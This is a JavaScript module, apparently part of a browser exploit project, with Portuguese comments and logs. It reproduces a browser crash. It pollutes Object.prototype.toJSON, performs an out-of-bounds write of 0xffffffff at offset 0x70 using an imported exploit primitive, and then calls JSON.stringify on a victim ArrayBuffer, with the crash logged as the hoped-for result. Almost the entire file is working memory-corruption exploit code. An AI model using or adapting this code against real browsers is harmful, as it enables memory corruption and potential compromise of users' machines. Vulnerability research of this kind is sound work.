// js/script3/testMemoryLeakViaJsonTC.mjs (ESTRATÉGIA: REPRODUÇÃO FIEL DO CRASH)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

// --- Configuração para Reprodução Fiel do Crash ---
const CRASH_CONFIG = {
    victim_ab_size: 64,
    // O offset exato que queremos testar
    corruption_offset: 0x70,
    // O valor exato que causou o crash
    corruption_value: 0xffffffff,
    bytes_to_write: 4,
    ppKey: 'toJSON',
};
// --- Fim dos Parâmetros ---

export async function reproduceInitialCrash() {
    const FNAME = "reproduceInitialCrash";
    logS3(`--- Iniciando Reprodução Fiel do Crash Original ---`, "test", FNAME);

    await triggerOOB_primitive();
    if (!oob_write_absolute) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME);
        return;
    }

    let victim_ab = new ArrayBuffer(CRASH_CONFIG.victim_ab_size);
    logS3(`ArrayBuffer vítima (${CRASH_CONFIG.victim_ab_size} bytes) criado.`, "info", FNAME);

    const ppKey = CRASH_CONFIG.ppKey;
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

    try {
        // Etapa 1: Poluir Object.prototype.toJSON. Este é o passo crucial que faltava.
        logS3(`Poluindo Object.prototype.${ppKey}...`, "info", FNAME);
        Object.defineProperty(Object.prototype, ppKey, {
            value: function() {
                // A simples existência desta função no caminho de execução é o que importa.
                logS3(`[${ppKey} Poluído] Chamado!`, "vuln", FNAME);
                return { polluted: true };
            },
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);

        // Etapa 2: Realizar a escrita OOB no offset exato.
        logS3(`CORRUPÇÃO: Escrevendo ${toHex(CRASH_CONFIG.corruption_value)} no offset ${toHex(CRASH_CONFIG.corruption_offset)}`, "warn", FNAME);
        oob_write_absolute(CRASH_CONFIG.corruption_offset, CRASH_CONFIG.corruption_value, CRASH_CONFIG.bytes_to_write);
        
        await PAUSE_S3(100);

        // Etapa 3: Chamar a função que aciona a vulnerabilidade.
        logS3("Chamando JSON.stringify(victim_ab)... O crash é o resultado esperado.", "vuln", FNAME);
        JSON.stringify(victim_ab);

        // Se chegarmos aqui, o crash não ocorreu.
        logS3("--- FALHA NA REPRODUÇÃO ---", "error", FNAME);
        logS3("O navegador não travou como esperado.", "error", FNAME);

    } catch (e) {
        logS3(`Um erro tratável ocorreu, o que também é um bom sinal: ${e.message}`, "good", FNAME);
    } finally {
        // Limpeza
        if (originalToJSONDescriptor) {
            Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
        } else {
            delete Object.prototype[ppKey];
        }
        clearOOBEnvironment();
        logS3("Ambiente limpo.", "info", FNAME);
    }
}
